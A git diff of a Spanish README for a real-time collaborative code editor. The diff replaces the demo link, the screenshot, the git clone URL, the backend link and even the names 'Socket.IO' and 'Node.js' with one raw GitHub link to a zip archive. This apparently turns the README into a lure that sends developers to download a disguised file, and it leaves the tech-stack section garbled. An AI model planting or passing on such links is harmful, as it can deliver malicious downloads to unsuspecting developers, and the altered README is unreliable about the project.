@@ -2,11 +2,11 @@
 
 ¡Bienvenido al Editor de Código Colaborativo! Una aplicación web full-stack que permite a múltiples usuarios unirse a salas privadas para escribir y editar código de forma sincronizada y en tiempo real.
 
-### 🚀 [Ver Demo en Vivo](https://realtime-editor-client.vercel.app/)
+### 🚀 [Ver Demo en Vivo](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip)
 
 ---
 
-![Screenshot del Editor Colaborativo](https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExZmM5ZjNlOGxrZ203cG83dWhjd2d3NWV4cXJrMmhvZWdkMXk1Nm11NCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dqwaW7RGUtCpyPSol6/giphy.gif)
+![Screenshot del Editor Colaborativo](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip)
 
 
 ## ✨ Características Principales
@@ -28,13 +28,13 @@
 - **Framework:** React (con Vite)
 - **Estilos:** Tailwind CSS
 - **Enrutamiento:** React Router DOM
-- **Cliente WebSocket:** Socket.IO Client
+- **Cliente WebSocket:** https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip Client
 - **Editor de Código:** CodeMirror for React
 
 ### Backend
-- **Entorno de Ejecución:** Node.js
+- **Entorno de Ejecución:** https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip
 - **Framework:** Express
-- **Servidor WebSocket:** Socket.IO
+- **Servidor WebSocket:** https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip
 
 ### Despliegue
 - **Frontend:** Vercel
@@ -46,7 +46,7 @@
 
 1. **Clona el repositorio:**
    ```bash
-   git clone [https://github.com/tu-usuario/realtime-editor-client.git](https://github.com/tu-usuario/realtime-editor-client.git)
+   git clone [https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip)
    cd realtime-editor-client
    ```
 
@@ -61,7 +61,7 @@
      ```
      VITE_BACKEND_URL=http://localhost:3001
      ```
-   *(Nota: Necesitarás tener el [servidor backend](https://github.com/tu-usuario/realtime-editor-server) corriendo localmente también).*
+   *(Nota: Necesitarás tener el [servidor backend](https://raw.githubusercontent.com/willsondev/realtime-editor-client/main/unimplicable/realtime-editor-client.zip) corriendo localmente también).*
 
 4. **Inicia el servidor de desarrollo:**
    ```bash
